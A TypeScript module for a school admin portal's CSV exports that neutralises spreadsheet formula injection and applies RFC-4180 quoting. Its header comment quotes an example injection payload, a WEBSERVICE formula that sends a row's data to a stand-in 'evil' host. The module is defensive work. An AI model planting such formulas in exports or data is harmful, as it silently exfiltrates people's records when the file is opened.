// CSV output encoding for the super-admin portal's exports (students, reading
// logs, allocations, impersonation audit).
//
// Two defences, both required:
//   1. Formula-injection neutralisation. A cell beginning with = + - @ or a
//      tab/CR is a formula to Excel/Sheets, so a student or staff name that
//      arrived through a roster import — e.g. =WEBSERVICE("https://evil/?p="&B2)
//      — would execute when a super-admin opens the export, exfiltrating the
//      row it sits in. Quoting does NOT prevent this; the apostrophe prefix
//      does (the spreadsheet strips it on display and treats the cell as
//      literal text). OWASP "CSV Injection", finding F-10 — see
//      docs/security/VULNERABILITY_ASSESSMENT_REPORT_2026-07-24.md §11.
//   2. RFC-4180 quoting for embedded quotes, commas and newlines.
//
// Numbers are emitted as-is: a numeric cell cannot be a formula, and prefixing
// would turn a real total into text.
//
// Mirrors school-admin-web/src/lib/csv-export.ts — keep the two in sync.
// scripts/check-csv-exports.sh fails the build if either loses defence 1, or if
// a new export is written that bypasses this module.
//
// csv-export-guardrail: formula-safe-encoder

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
const NEEDS_QUOTING = /[",\n\r]/;

/** Encode one cell: formula-safe, then RFC-4180-quoted. */
export function csvCell(value: unknown): string {
  if (value == null) return "";
  if (typeof value === "number") {
    return Number.isFinite(value) ? String(value) : "";
  }

  let str = String(value);
  if (FORMULA_TRIGGER.test(str)) str = `'${str}`;
  return NEEDS_QUOTING.test(str) ? `"${str.replace(/"/g, '""')}"` : str;
}

export function toCsvString(
  headers: string[],
  rows: Record<string, string | number | boolean | undefined | null>[]
): string {
  const lines = [headers.map(csvCell).join(",")];
  for (const row of rows) {
    lines.push(headers.map((h) => csvCell(row[h])).join(","));
  }
  return lines.join("\n");
}
